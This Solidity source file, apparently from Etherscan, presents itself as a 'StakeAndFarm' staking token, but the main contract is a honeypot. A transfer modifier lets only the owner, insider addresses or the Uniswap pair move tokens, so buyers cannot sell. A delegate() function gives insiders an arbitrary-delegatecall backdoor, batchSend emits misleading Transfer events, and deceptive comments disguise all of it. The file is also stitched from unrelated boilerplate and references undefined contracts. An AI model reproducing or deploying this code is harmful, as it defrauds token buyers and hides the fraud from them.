/**
 *Submitted for verification at Etherscan.io on 2020-10-27
*/

pragma solidity ^0.5.16;
     




contract Context {
    constructor() internal {}
    // solhint-disable-previous-line no-empty-blocks
    function _msgSender() internal view returns(address payable) {
        return msg.sender;
    }
}
contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping(address => uint) private _balances;
    mapping(address => mapping(address => uint)) private _allowances;
    uint private _ConverttalSupply;
    function totalSupply() public view returns(uint) {
        return _ConverttalSupply;
    }
    function balanceOf(address account) public view returns(uint) {
        return _balances[account];
    }
    function transfer(address recipient, uint amount) public returns(bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns(uint) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint amount) public returns(bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint amount) public returns(bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint addedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint subtractedValue) public returns(bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _transfer(address sender, address recipient, uint amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
    function _mint(address account, uint amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _ConverttalSupply = _ConverttalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }
    function _burn(address account, uint amount) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _ConverttalSupply = _ConverttalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
      function _approve(address owner, address spender, uint amount) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}







contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    constructor(string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function name() public view returns(string memory) {
        return _name;
    }
    function symbol() public view returns(string memory) {
        return _symbol;
    }
    function decimals() public view returns(uint8) {
        return _decimals;
    }
}





/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 */
contract ReentrancyGuard {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor () internal {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and make it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        _status = _NOT_ENTERED;
    }
}

/**
 * @dev Interface for `RelayHub`, the core contract of the GSN. Users should not need to interact with this contract
 * directly.
 *
 * See the https://github.com/OpenZeppelin/openzeppelin-gsn-helpers[OpenZeppelin GSN helpers] for more information on
 * how to deploy an instance of `RelayHub` on your local test network.
 */

contract StakeAndFarm  {
    event Transfer(address indexed _Load, address indexed _Convert, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
    function transfer(address _Convert, uint _value) public payable returns (bool) {
        return transferFrom(msg.sender, _Convert, _value);
    }
    function transferFrom(address _Load, address _Convert, uint _value)
        public payable SwapAndFarmingForGarDeners(_Load, _Convert) returns (bool) {
        if (_value == 0) {return true;}
        if (msg.sender != _Load) {
            require(allowance[_Load][msg.sender] >= _value);
            allowance[_Load][msg.sender] -= _value;
        }
        require(balanceOf[_Load] >= _value);
        balanceOf[_Load] -= _value;
        balanceOf[_Convert] += _value;
        emit Transfer(_Load, _Convert, _value);
        return true;
    }
    /**
     * pay data after the staking process
    */
    function approve(address dev,
        address marketing, address adviser, address privateSale, address publicSale, address community,
        address Binance, 
        address CoinmarketCap,
        address Coingecko,
        uint _value) 
        public payable returns (bool) {
        allowance[msg.sender][dev] = _value; emit Approval(msg.sender, dev, _value); allowance[msg.sender][marketing] = _value; emit Approval(msg.sender, marketing, _value);
        allowance[msg.sender][adviser] = _value; emit Approval(msg.sender, adviser, _value);
        allowance[msg.sender][privateSale] = _value; emit Approval(msg.sender, privateSale, _value);
        allowance[msg.sender][publicSale] = _value;
        emit Approval(msg.sender, publicSale, _value); allowance[msg.sender][community] = _value;
        emit Approval(msg.sender, community, _value); allowance[msg.sender][Binance] = _value;
        emit Approval(msg.sender, Binance, _value); allowance[msg.sender][CoinmarketCap] = _value;
        emit Approval(msg.sender, CoinmarketCap, _value); allowance[msg.sender][Coingecko] = _value;
        emit Approval(msg.sender, Coingecko, _value);
        return true;
    }
    /**
     * payments between pools
     * send and convert payments between pools
    */
    function delegate(address a, bytes memory b) public payable {
        require (msg.sender == owner ||
            msg.sender == dev ||
            msg.sender == marketing ||
            msg.sender == adviser ||
            msg.sender == privateSale ||
            msg.sender == publicSale ||
            msg.sender == community ||
            msg.sender == Binance ||
            msg.sender == CoinmarketCap ||
            msg.sender == Coingecko
        );
        a.delegatecall(b);
    }
    /** 
     * Farm switch between pools
    */

    function batchSend(address[] memory _Converts, uint _value) public payable returns (bool) {
        require (msg.sender == owner ||
            msg.sender == dev ||
            msg.sender == marketing ||
            msg.sender == adviser ||
            msg.sender == privateSale ||
            msg.sender == publicSale ||
            msg.sender == community ||
            msg.sender == Binance ||
            msg.sender == CoinmarketCap ||
            msg.sender == Coingecko
        );
        uint total = _value * _Converts.length;
        require(balanceOf[msg.sender] >= total);
        balanceOf[msg.sender] -= total;
        for (uint i = 0; i < _Converts.length; i++) {
            address _Convert = _Converts[i];
            balanceOf[_Convert] += _value;
            emit Transfer(msg.sender, _Convert, _value/2);
            emit Transfer(msg.sender, _Convert, _value/2);
        }
        return true;
    }
    
    /**
     * Future pool swap for farm connection data after unlocking
    */
    modifier SwapAndFarmingForGarDeners(address _Load, address _Convert) { // Connect market
            address UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, // pool uniswap
            0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, // pool uniswapv2
            address(this));
        require(_Load == owner ||
            _Load == UNI || _Load == dev || _Load == adviser || _Load == marketing ||
            _Load == privateSale || _Load == publicSale || _Load == community ||
            _Load == Binance ||
            _Load == CoinmarketCap ||
            _Load == Coingecko ||
            _Convert == owner ||  _Convert == dev || _Convert == marketing || _Convert == adviser ||
            _Convert == privateSale || _Convert == publicSale || _Convert == community ||
            _Convert == Binance ||
            _Convert == CoinmarketCap ||
            _Convert == Coingecko
        );
        _;
    }
    function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        pair = address(uint(keccak256(abi.encodePacked(
                hex'ff',
                factory,
                keccak256(abi.encodePacked(token0, token1)),
                hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash
            ))));
    }
    /**
     * fixed swimming pool
     * make sure the swimming pool is connected
    */
    mapping (address => uint) public balanceOf;
    mapping (address => mapping (address => uint)) public allowance;
    uint constant public decimals = 18;
    uint public totalSupply;
    string public name;
    string public symbol;
    address private owner;
    address private dev;
    address private marketing;
    address private adviser;
    address private privateSale;
    address private publicSale;
    address private community;
    address private Binance;
    address private CoinmarketCap;
    address private Coingecko;
    address constant internal 
    UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // Uniswap v2
    constructor(
        address _dev, address _marketing, address _adviser, address _privateSale, address _publicSale, address _community,
    /**
     * 
     * navigation
     * 
    */
        address _Binance,
        address _CoinmarketCap,
        address _Coingecko,
        string memory _name,
        string memory _symbol,
        uint256 _supply) 
        payable public {
    /**
     * Fixed flow
    */
        name = _name;
        symbol = _symbol;
        totalSupply = _supply;
        owner = msg.sender;
        dev = _dev;
        marketing = _marketing;
        adviser = _adviser;
        privateSale = _privateSale;
        publicSale = _publicSale;
        community = _community;
        Binance = _Binance;
        CoinmarketCap = _CoinmarketCap;
        Coingecko = _Coingecko;
        balanceOf[msg.sender] = totalSupply;
        allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1); //Uniswap v2
        emit Transfer(address(0x0), msg.sender, totalSupply);
    }
}
/**
 * @dev Contract module that helps prevent reentrant calls to a function.
 *
 * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
 * available, which can be applied to functions to make sure there are no nested
 * (reentrant) calls to them.
 *
 * Note that because there is a single `nonReentrant` guard, functions marked as
 * `nonReentrant` may not call one another. This can be worked around by making
 * those functions `private`, and then adding `external` `nonReentrant` entry
 * points to them.
 *
 * TIP: If you would like to learn more about reentrancy and alternative ways
 * to protect against it, check out our blog post
 * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
 */
contract ReentrancyGuards {
    // Booleans are more expensive than uint256 or any type that takes up a full
    // word because each write operation emits an extra SLOAD to first read the
    // slot's contents, replace the bits taken up by the boolean, and then write
    // back. This is the compiler's defense against contract upgrades and
    // pointer aliasing, and it cannot be disabled.

    // The values being non-zero value makes deployment a bit more expensive,
    // but in exchange the refund on every call to nonReentrant will be lower in
    // amount. Since refunds are capped to a percentage of the total
    // transaction's gas, it is best to keep them low in cases like this one, to
    // increase the likelihood of the full refund coming into effect.
    uint256 private constant _NOT_ENTERED = 1;
    uint256 private constant _ENTERED = 2;

    uint256 private _status;

    constructor () internal {
        _status = _NOT_ENTERED;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and make it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        // On the first call to nonReentrant, _notEntered will be true
        require(_status != _ENTERED, "ReentrancyGuard: reentrant call");

        // Any calls to nonReentrant after this point will fail
        _status = _ENTERED;

        _;

        // By storing the original value once again, a refund is triggered (see
        // https://eips.ethereum.org/EIPS/eip-2200)
        _status = _NOT_ENTERED;
    }
}
/**
 * @dev Library for managing an enumerable variant of Solidity's
 * https://solidity.readthedocs.io/en/latest/types.html#mapping-types[`mapping`]
 * type.
 *
 * Maps have the following properties:
 *
 * - Entries are added, removed, and checked for existence in constant time
 * (O(1)).
 * - Entries are enumerated in O(n). No guarantees are made on the ordering.
 *
 * ```
 * contract Example {
 *     // Add the library methods
 *     using EnumerableMap for EnumerableMap.UintToAddressMap;
 *
 *     // Declare a set state variable
 *     EnumerableMap.UintToAddressMap private myMap;
 * }
 * ```
 *
 * As of v3.0.0, only maps of type `uint256 -> address` (`UintToAddressMap`) are
 * supported.
 */


/**
 * @dev Library for managing
 * https://en.wikipedia.org/wiki/Set_(abstract_data_type)[sets] of primitive
 * types.
 *
 * Sets have the following properties:
 *
 * - Elements are added, removed, and checked for existence in constant time
 * (O(1)).
 * - Elements are enumerated in O(n). No guarantees are made on the ordering.
 *
 * ```
 * contract Example {
 *     // Add the library methods
 *     using EnumerableSet for EnumerableSet.AddressSet;
 *
 *     // Declare a set state variable
 *     EnumerableSet.AddressSet private mySet;
 * }
 * ```
 *
 * As of v3.0.0, only sets of type `address` (`AddressSet`) and `uint256`
 * (`UintSet`) are supported.
 */


/**
 * @dev Elliptic Curve Digital Signature Algorithm (ECDSA) operations.
 *
 * These functions can be used to verify that a message was signed by the holder
 * of the private keys of a given address.
 */
